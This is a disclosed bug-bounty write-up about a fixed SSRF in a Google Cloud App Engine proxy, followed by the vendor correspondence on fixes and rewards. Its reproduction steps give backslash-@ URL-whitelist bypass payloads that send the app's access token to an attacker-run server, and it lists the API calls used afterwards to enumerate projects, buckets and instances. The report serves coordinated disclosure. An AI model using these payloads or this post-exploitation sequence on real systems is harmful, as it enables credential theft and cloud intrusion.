---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2021-11-17_url-whitelist-bypass-in-httpscxl-servicesappspotcom.md
original_filename: 2021-11-17_url-whitelist-bypass-in-httpscxl-servicesappspotcom.md
title: URL whitelist bypass in https://cxl-services.appspot.com
category: documents
detected_topics:
- oauth
- access-control
- ssrf
- command-injection
- otp
- automation-abuse
tags:
- imported
- documents
- oauth
- access-control
- ssrf
- command-injection
- otp
- automation-abuse
language: en
raw_sha256: 2ad3426fef3a131745e1d3efd0430d7a8d5b05816be93cc4a52d10e7d26de0aa
text_sha256: ee5839c7b42a1a66f0bf8129a17178249f7d6d0d94b3b7cf1a13efdf119eb58e
ingested_at: '2026-06-28T07:32:08Z'
sensitivity: unknown
redactions_applied: false
---

# URL whitelist bypass in https://cxl-services.appspot.com

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2021-11-17_url-whitelist-bypass-in-httpscxl-servicesappspotcom.md
- Source Type: markdown
- Detected Topics: oauth, access-control, ssrf, command-injection, otp, automation-abuse
- Ingested At: 2026-06-28T07:32:08Z
- Redactions Applied: False
- Raw SHA256: `2ad3426fef3a131745e1d3efd0430d7a8d5b05816be93cc4a52d10e7d26de0aa`
- Text SHA256: `ee5839c7b42a1a66f0bf8129a17178249f7d6d0d94b3b7cf1a13efdf119eb58e`


## Content

---
title: "URL whitelist bypass in https://cxl-services.appspot.com"
page_title: "[#0008] SSRF via URL whitelist bypass in a Google Cloud owned App Engine service | feed"
url: "https://feed.bugs.xdavidhu.me/bugs/0008"
final_url: "https://feed.bugs.xdavidhu.me/bugs/0008"
authors: ["David Schütz (@xdavidhu)"]
programs: ["Google"]
bugs: ["Privilege escalation", "URL validation bypass", "SSRF"]
bounty: "10,401.1"
publication_date: "2021-11-17"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 3159
---

#0008  
Vendor: Google  
Status: fixed  
Reported: Mar 23, 2021  
Disclosed: Jun 23, 2021 (92 days) 

# SSRF via URL whitelist bypass in a Google Cloud owned App Engine service

**Summary:**

Access Token for internal GCP project “cxl-services” (with scopes `"https://www.googleapis.com/auth/dispatcher`, `https://www.googleapis.com/auth/jobs` and `https://www.googleapis.com/auth/cloud-platform"`) can be leaked using a URL whitelist bypass on `https://cxl-services.appspot.com/proxy`. This token could be used to elevate privileges in other internal projects, access some internal Compute instances and possibly take full control over `cxl-services.appspot.com`. This App Engine app proxies demo API requests on Google Cloud product pages (e.g. Cloud Text-to-Speech Demo).

**Core Issue:**

The domain whitelist check on `cxl-services.appspot.com` can be bypassed with the `\@` trick. It is probably using the vulnerable regex from <https://tools.ietf.org/html/rfc3986#appendix-B>.

When validating the URL `https://[your_domain]\@jobs.googleapis.com`, the regex thinks that the authority is `jobs.googleapis.com`, but the library making the request actually parses `[your_domain]` as the authority, and `/@jobs.googleapis.com` as the path.

**Steps to Reproduce:**

_If you already have an HTTPS server where you can view request headers, skip to`Step 5.`._  
_You can probably use plain HTTP and`netcat`, but then the access token would be transported unencryped._

  1. Set up a VPS, and point a domain to it
  2. Generate an SSL certificate with LetsEncrypt
  3. Download my [`httpsserver.py` Python script](https://gist.github.com/xdavidhu/9491a9918b4dfbaffb789a8b9f2d1672), and fill out the `hostname` variable on `line 5`
  4. Create an empty directory, `cd` into it, and start the server with `sudo /path/to/httpsserver.py --verbose`
  5. With a browser, open the URL `https://cxl-services.appspot.com/proxy?url=https://[your_domain]\@jobs.googleapis.com/`
  6. On your VPS, see that the `cxl-services.appspot.com` App Engine app has sent a request with the header `authorization: Bearer [access-token]`

**Post-Exploitation:**

I’ve sent some (in my viewpoint, harmless) read-only requests with the access-token to prove impact, here is what I found:

This access token has (some) access to these GCP projects:

  * `docai-demo`
  * `cxl-services`
  * `garage-staging`
  * `p-jobs`

Based on some other API requests I made, it feels like the token has “full” access to `docai-demo` and `cxl-services`, and limited access on `garage-staging` and `p-jobs`.

On the project `docai-demo` I have found 2 GCE instances:

  * `gke-cluster-1-default-pool-af71d616-j454` (`35.193.88.22`)
  * `gke-cluster-1-default-pool-af71d616-stj9` (`35.223.244.119`)

Both of these instances have the metadata entry with key `kube-env` witch exposes (to my limited Kubernetes knowledge) all of the node’s credentials: `KUBELET_CERT`, `KUBELET_KEY` and `CA_CERT`.

The project `cxl-services` is hosting the App Engine app `https://cxl-services.appspot.com/`, which proxies demo API requests on the Google Cloud product pages. It feels like this access token has **full access to this App Engine app** , but I wasn’t able to prove any impact here, since the API `appengine.googleapis.com` is not enabled on the `cxl-services` project, and I didn’t want to enable it.

I also saw some enabled `staging` or `autopush` APIs, so some non-public APIs/versions might be available using these projects.

Interestingly enough, I wasn’t able to hit the Metadata API using this domain bypass. Every attempt resulted in `500 Internal Server Error`. But it looks like this access token has the same privileges as the service account I could have stolen from the Metadata API.

**Documentation of my actions:**

During testing I might have made `cxl-services.appspot.com` send HTTP / HTTPS requests (with the access token) to these domains _not_ under my control:

  * `xip.io` (for `169.254.169.254.xip.io`)
  * `screenshot.googleplex.com`
  * `xdavidhu.me` (GitHub Pages)
  * `jobs.go` (unexistent domain)
  * `169.254.169.253`,`169.254.169.254`,`metadata`,`metadata.google.internal` (for metadata testing without success)
  * `jobs.googleapis.com`, `texttospeech.googleapis.com`

I have called these API methods with the access tokens obtained:

  * `https://oauth2.googleapis.com/tokeninfo`
  * `https://cloudresourcemanager.googleapis.com/v1/projects`
  * `https://appengine.googleapis.com/v1/apps/[project]/services` (`cxl-services`)
  * `https://compute.googleapis.com/compute/v1/projects/[project]/aggregated/instances` (`garage-staging`, `cxl-services`, `docai-demo`)
  * `https://servicemanagement.googleapis.com/v1/services?consumerId=project:[project]` (`cxl-services`, `p-jobs`, `garage-staging`, `docai-demo`)
  * `https://cloudconsole-pa.clients6.google.com/v2/entity/APP_ENGINE_VERSIONS_LIST` (`cxl-services`)

**Impact:**

An anonymous attacker could exploit the URL validation vulnerability, and steal the access token the `cxl-services.appspot.com` App Engine app is sending.

Using this access token, the attacker could access resources on GCP projects `docai-demo`, `cxl-services`,`garage-staging` and `p-jobs`.

Some attacks I think could be performed by an attacker:

  * Take over the App Engine app `https://cxl-services.appspot.com/`, and steal the contents of all demo API requests and/or return malicious content to the users trying out the demos on the Cloud product pages.
  * Take over the GKE cluster used by `docai-demo`, (which is probably running the demo on `https://cloud.google.com/document-ai`) and steal the contents of all demo API requests and/or return malicious content. This falls under the first attack’s impact, since this demo is also proxied by `cxl-services.appspot.com`.
  * Try escalate privileges and maybe gain access to more internal Google Cloud resources.

* * *

### Comments:

**Vendor - 2021-03-23 12:10**

_NOTE: This e-mail has been generated automatically._

Thanks for your report.

This email confirms we’ve received your message. We’ll investigate and get back to you once we’ve got an update. In the meantime, you might want to take a look at the [list of frequently asked questions about Google VRP](https://sites.google.com/site/bughunteruniversity/behind-the-scenes/faq).

If you are reporting a security vulnerability and wish to appear in Google Security Hall of Fame, please [create a profile](https://bughunter.withgoogle.com/new_profile).

You appear automatically in our Honorable Mentions if we decide to file a security vulnerability based on your report, and you will also show up in our Hall of Fame if we issue a reward.

**Note that if you did not report a vulnerability, or a technical security problem in one of our products, we won’t be able to act on your report. This channel is not the right one if you wish to resolve a problem with your account, report non-security bugs, or suggest a new feature in our product.**

Cheers,  
Google Security Bot

[Follow us](https://twitter.com/googlevrp) on Twitter!

* * *

**Vendor - 2021-03-23 18:58**

_NOTE: This e-mail has been generated automatically._

Hey,

Just letting you know that your report was **triaged** and we’re currently looking into it.

You should receive a response in a couple of days, but it might take up to a week if we’re particularly busy. In the meantime, you might want to take a look at [the list of frequently asked questions about Google VRP](https://sites.google.com/site/bughunteruniversity/behind-the-scenes/faq).

Thanks,  
Google Security Bot

* * *

**Me - 2021-03-28 21:29**

Hi,

**I was able to demonstrate full access to the`cxl-services.appspot.com` GAE app** by deploying a `vrp-poc` service: <https://vrp-poc-dot-cxl-services.appspot.com/>

I found some other sensitive things on project `cxl-services`:

  * The bucket `cxl-services.appspot.com` **has hourly`appengine.googleapis.com/request_log` files** since `2017-10-18` up until today. These might contain sensitive user data.
  * The bucket `staging.cxl-services.appspot.com` _(was, now I uploaded the 3 POC files)_ empty, so the source files were not available. (The `get-version` AppEngine API call listed all filenames, like `google3/cloud/ux/services/services/proxy.py`) **But** , the `us.artifacts.cxl-services.appspot.com` bucket had some images, from which **the source code could be extracted**.

The requests I have made with the obtained access tokens:
  
  
  - https://servicemanagement.googleapis.com/v1/services/appengine.googleapis.com
  - https://servicemanagement.googleapis.com/v1/services/issuetracker.corp.googleapis.com
  - https://serviceusage.googleapis.com/v1beta1/projects/cxl-services/services/appengine.googleapis.com:enable
  - https://cloudconsole-pa.clients6.google.com/graphql/SERVICE_USAGE_GRAPHQL
  - https://servicemanagement.googleapis.com/v1/services/appengine.googleapis.com:enable?consumer_id=project%3Acxl-services (success)
  - https://appengine.googleapis.com/v1/apps/cxl-services.appspot.com/services
  - https://appengine.googleapis.com/v1/apps/cxl-services/services
  - https://appengine.googleapis.com/v1/apps/cxl-services/services/default/versions
  - https://servicemanagement.googleapis.com/v1/services/issuetracker.corp.googleapis.com:enable?consumer_id=project%3Acxl-services (fail)
  - https://appengine.googleapis.com/v1/apps/cxl-services/services/default/versions/b347699687-dev-gokulr
  - https://appengine.googleapis.com/v1/apps/cxl-services/services/default/versions/b347699687-dev-gokulr?view=FULL
  - https://storage.googleapis.com/staging.cxl-services.appspot.com/ae-fingerprinted/5d8be43828d2c7161e68484222b6212529235137 (404)
  - https://storage.googleapis.com/staging.cxl-services.appspot.com/ae-fingerprinted/ (404)
  - https://storage.googleapis.com/staging.cxl-services.appspot.com/ (empty)
  - https://storage.googleapis.com/storage/v1/b?alt=json&fields=items%2Fid%2CnextPageToken&maxResults=1000&project=cxl-services&projection=noAcl
  - https://storage.googleapis.com/cxl-services.appspot.com/ (request log!)
  - https://storage.googleapis.com/artifacts.cxl-services.appspot.com/ (empty)
  - https://storage.googleapis.com/us.artifacts.cxl-services.appspot.com/ (images!)
  - https://storage.googleapis.com/storage/v1/b/cxl-services.appspot.com/o?alt=json&fields=items%2Fid%2CnextPageToken&maxResults=1000&project=cxl-services&projection=noAcl
  - https://storage.googleapis.com/storage/v1/b/cxl-services.appspot.com/o?alt=json&maxResults=1000&project=cxl-services&projection=noAcl (log sizez!)
  
  - https://storage.googleapis.com/upload/storage/v1/b/staging.cxl-services.appspot.com/o?alt=json&name=e8439a6b8f01e74d2dfc52eba0604d8c6885c834&uploadType=multipart
  - https://storage.googleapis.com/upload/storage/v1/b/staging.cxl-services.appspot.com/o?alt=json&name=28e492b17a63d596557c1c73ef4ac3e18447a21e&uploadType=multipart
  - https://storage.googleapis.com/upload/storage/v1/b/staging.cxl-services.appspot.com/o?alt=json&name=125e0b77828c18da7d6e2e698800b63996579658&uploadType=multipart
  - https://storage.googleapis.com/staging.cxl-services.appspot.com/
  - https://storage.googleapis.com/staging.cxl-services.appspot.com/
  - https://appengine.googleapis.com/v1/apps/cxl-services/services/vrp-poc/versions?alt=json
  
  - https://storage.googleapis.com/storage/v1/b/cxl-services.appspot.com/o
  - https://storage.googleapis.com/storage/v1/b/cxl-services.appspot.com/o?prefix=appengine.googleapis.com/request_log/2021
  

* * *

**Vendor - 2021-03-29 08:53**

Hi,

🎉 **Nice catch!** I’ve filed a bug based on your report.

The panel will evaluate it at the next VRP panel meeting and we’ll update you once we’ve got more information. All you need to do now is wait. If you don’t hear back from us in 2-3 weeks or have additional information about the vulnerability, let us know!

Regards,  
[redacted], Google Security Team

* * *

**Vendor - 2021-03-29 09:03**

Hi David,

Thanks for the report, nice! great that you are not downloading files with potential PII, could you please confirm that you didn’t download them? If it was by mistake during testing please let us know which files, thanks!

Regards, [redacted], Google Security Team

* * *

**Me - 2021-03-29 09:12**

Hi,

I only sent the requests documented above.

The files which could contain user-information I think (from my testing) are only the logs in `cxl-services.appspot.com`. I didn’t download any of those objects, I just listed the contents of the bucket. (multiple times, even with a prefix to see if there are logs from 2021.)

Thank you, David

* * *

**Me - 2021-03-29 09:22**

Hi,

There are still 3 projects for this access token that I didn’t really look into: `docai-demo` `garage-staging` `p-jobs`

Can I play with these, or should I stop testing for now?

Thank you,  
David

* * *

**Vendor - 2021-03-29 10:01**

Hi David,

Thanks for the info and quick followup.

Please don’t continue - the info we have is enough to fix and determine the reward, thanks!

[redacted]

* * *

**Vendor - 2021-04-13 18:20**

** NOTE: This is an automatically generated email **

Hello,

Thank you for reporting this bug. As part of Google’s Vulnerability Reward Program, the panel has decided to issue a reward of $4133.70.

Rationale for this decision: 1k bonus for the well written report and documenting lateral movement. Thanks! :)

Important: if you aren’t registered with Google as a supplier, p2p-vrp@google.com will reach out to you. If you have registered in the past, no need to do it again - sit back and relax, and we will process the payment soon.

If you have any payment related requests, please direct them to p2p-vrp@google.com. Please remember to include the subject of this email and the email address that the report was sent from. Regards,

Google Security Bot

If you’d like your name added to our Hall of Fame:
  
  
  https://bughunter.withgoogle.com/
  

Just create a profile here: https://bughunter.withgoogle.com/new_profile

In addition, we encourage you to signup for our Vulnerability Research Grants program, where we issue monetary payments to VRP researchers, even when no vulnerabilities are found. To read more about the program visit: https://www.google.com/about/appsecurity/research-grants/

– How did we do? Please fill out a short anonymous survey (https://goo.gl/IR3KRH).

* * *

**Me - 2021-06-01 12:08**

Hi,

Just a heads-up, this issue will be disclosed in 20 days, on `2021-06-21`.

I might make a video about this using screen recordings of finding the bug. These recordings include some internal information. Should I redact any particular details?

Also, my POC is still up and running: <https://vrp-poc-dot-cxl-services.appspot.com/>

Thank you,  
David

* * *

**Vendor - 2021-06-01 12:24**

Hi,

Thanks for the heads up about the disclosure of your report.

Please read [our stance on coordinated disclosure](https://security.googleblog.com/2010/07/rebooting-responsible-disclosure-focus.html). In essence, **our pledge to you is to respond promptly and fix vulnerabilities in a sensible timeframe** \- and in exchange, **we ask for a reasonable advance notice**.

Some things to note:

  1. We might decide not to file a bug, or not to issue a VRP reward. Even if this is the case, please still coordinate your disclosure with us. Many of the reports we receive don’t describe vulnerabilities with an impact that qualifies for a reward, but we still want to make sure we are prepared for your vulnerability disclosure.
  2. We usually decide and pay the rewards before the vulnerability is fixed. The reward is not a payment for your silence, but we really want to have a chance to fix it on time for your disclosure, so please keep us up to date with the disclosure timeline, so we can update the engineering team of your plans.
  3. If you gave us enough time to fix the described issue (you can read https://www.google.com/about/appsecurity/ for inspiration), and we are anyway unable to fix it before your disclosure date, we’ll try to let you know in time (the disclosure date would still be your own decision).

At the end, **the decision on what to disclose and when is yours** , and we would be happy to forward any blog posts, slides, or paper drafts you might have to our teams internally (we might even provide you feedback). Thanks again for your help.

PS. If you give a talk, or make a blog post, or similar about this bug, please send us a link, we would love to read it, we might even tweet it from [our Twitter account](https://twitter.com/GoogleVRP).

* * *

**Me - 2021-06-16 12:10**

Hi,

So before starting to work on the writeup, I wanted to test the fix. It indeed fixed the original trick of using `https://[your_domain]\@jobs.googleapis.com`.

But playing around a bit, I have found a way to once again bypass the URL whitelist:  
`https://cxl-services.appspot.com/proxy?url=https://sfmnev.vps.xdavidhu.me\_@jobs.googleapis.com/`

Opening this URL sends a request to my server with an access token.

Actually, it is not specific to the `_` character. Putting anything between the `\` and the `@` bypasses the whitelist, for example:  
`https://cxl-services.appspot.com/proxy?url=https://sfmnev.vps.xdavidhu.me\anything@jobs.googleapis.com/`

Thank you,  
David

* * *

**Me - 2021-06-17 09:36**

Hi,

Will a fix roll out until `2021-06-21`?  
If a fix will be deployed, but not until the deadline, I can delay the disclosure 14 days, with a new date of `2021-07-05`.

Let me know if I should delay the disclosure, of if a fix is coming.

Thank you,  
David

* * *

**Vendor - 2021-06-18 11:38**

Heya David,

So this one has been marked fixed by the product team, but its pending verification that the fix is accurate on our side. Ostensibly the fix is live now. (just unverified/checked by us)

You’ll get a notification when we’ve done the verification, but in the above context, I think the answer is the fix is deployed :D

cheers

* * *

**Me - 2021-06-18 12:13**

Hi,

I meant the fix for the bypass I found in comment #13. Did the product team fix that as well?

Thank you,  
David

* * *

**Vendor - 2021-06-22 18:07**

Hey,

Looks like the team did not know about that bypass. I reopened the bug and the team says it should be fixed now. Thanks!

* * *

**Me - 2021-06-23 18:32**

Hi,

I can confirm that the bypass is also fixed now. My GAE POC is still running, but I’m fine with that :)

This report with all additional comments (with names redacted) has been published. You can find it here:  
https://feed.bugs.xdavidhu.me/bugs/0008

Thank you,  
David

* * *

**Vendor - 2021-06-24 18:20**

** NOTE: This is an automatically generated email **

Hello,

Regarding our Vulnerability Reward Program: The VRP panel has decided to issue a reward of $3133.70 for your report. Congratulations!

Rationale for this decision: Thanks for reporting the bypass!

Important: If you aren’t already registered with Google as a supplier, p2p-vrp@google.com will reach out to you. If you have registered in the past, no need to repeat the process – you can sit back and relax, and we will process the payment soon.

Note: This month, we are changing our payment processing backend. There might be small delays (a few weeks) with how the payments are processed. Thanks for understanding, and sorry for the trouble!

If you have any payment related requests, please direct them to p2p-vrp@google.com. Please remember to include the subject of this email and the email address that the report was sent from.

Regards,

Google Security Bot

P.S. Two other things we’d like to mention:

  * If you’d like us to add your name to our Hall of Fame at https://bughunter.withgoogle.com/rank/hof, please create a profile at https://bughunter.withgoogle.com/new_profile if you haven’t already done so.
  * We encourage you to sign up for our Vulnerability Research Grants program at https://www.google.com/about/appsecurity/research-grants/, where we issue monetary payments to VRP researchers, even when no vulnerabilities are found.

– How did we do? Please fill out a short anonymous survey (https://goo.gl/IR3KRH).

* * *

**Me - 2021-08-28 13:12**

Hi,

So I bypassed it again. The old vulnerable versions are still there on the AppEngine app, and even though the latest version is fixed, you can still call the old versions of the `default` service.

POC:
  
  
  https://b347699687-dev-gokulr-dot-default-dot-cxl-services.appspot.com/proxy?url=https://sfmnev.vps.xdavidhu.me\@jobs.googleapis.com/
  

_(This time I have sent two requests to my VM and one to GitHub Pages (`https://xdavidhu.me/`). The GAE app’s access token is in the `authorization` header.)_

Thank you,  
David

* * *

**Me - 2021-08-28 13:13**

Also, my POC service is still up and running: https://vrp-poc-dot-cxl-services.appspot.com/

* * *

**Vendor - 2021-09-01 11:49**

Hi,

🙏 Thanks again for your report! I’ve updated the internal bug we already had about this issue. We’ll work with the product team to ensure this issue is addressed. We’ll let you know when the issue was fixed.

Regarding our Vulnerability Reward Program: The VRP panel will evaluate your report at the next meeting. We’ll update you once we’ve come to a decision. If you don’t hear back from us in 2-3 weeks, or if you have additional information about the vulnerability, let us know!

Regards,  
[redacted], Google Security Team

* * *

**Vendor - 2021-09-02 19:00**

** NOTE: This is an automatically generated email **

Hello,

Regarding our Vulnerability Reward Program: The VRP panel has decided to issue a reward of $3133.70 for your report. Congratulations!

Rationale for this decision: Thanks for letting us know about the bypass!

Important: If you aren’t already registered with Google as a supplier, p2p-vrp@google.com will reach out to you. If you have registered in the past, no need to repeat the process – you can sit back and relax, and we will process the payment soon.

If you have any payment related requests, please direct them to p2p-vrp@google.com. Please remember to include the subject of this email and the email address that the report was sent from.

Regards,

Google Security Bot

P.S. Two other things we’d like to mention:

  * If you’d like us to add your name to our Leaderboard at https://bughunters.google.com/leaderboard, please create a profile at https://bughunters.google.com if you haven’t already done so.
  * We encourage you to sign up for our Vulnerability Research Grants program at https://www.google.com/about/appsecurity/research-grants/, where we issue monetary payments to VRP researchers, even when no vulnerabilities are found.

– How did we do? Please fill out a short anonymous survey (https://goo.gl/IR3KRH).

* * *

**Me - 2021-11-12 18:38**

Hi,

The latest bypass looks fixed as well. I am creating a YouTube video about this bug. I plan to release in the next couple of days.

The video includes screen recordings of me finding the vulnerability, and exploiting it. It includes some internal details that I accessed during the research of this bug. My actions during the research are documented above.

If you’d like me to redact some details, please let me know.

Thank you,  
David

* * *

**Vendor - 2021-11-15 14:32**

Hi David,

Thanks again for a great report!

What are the internal details - GCP project names? The logs are just content of the bucket (file names)?

Regards, [redacted], Google Security Team

* * *

**Me - 2021-11-15 14:43**

Hi [redacted],

It’s everything I saw during the finding of this issue.  
This is the yet-unreleased video: https://youtu.be/UyemBjyQ4qA

I redacted a private key I saw when listing the VMs inside the `docai-demo` project, and I also redacted your names in the issuetracker responses.  
Otherwise, I think most of the information is already disclosed at https://feed.bugs.xdavidhu.me/bugs/0008

Please let me know if this is good to go.

Thank you,  
David

* * *

**Me - 2021-11-16 16:10**

Hi,

What is the ETA of this approval?

Thank you,  
David

* * *

**Vendor - 2021-11-17 15:52**

Hi David,

Thanks for your patience. We really appreciate that you sent the video to us as we don’t require that - please use your best judgement similar to when you publish your write-ups. If there is not more info than in the write-up then it’s fine.

It was funny to see you when you realized what you found;)

Good luck with your bughunting videos!

Regards, [redacted], Google Security Team
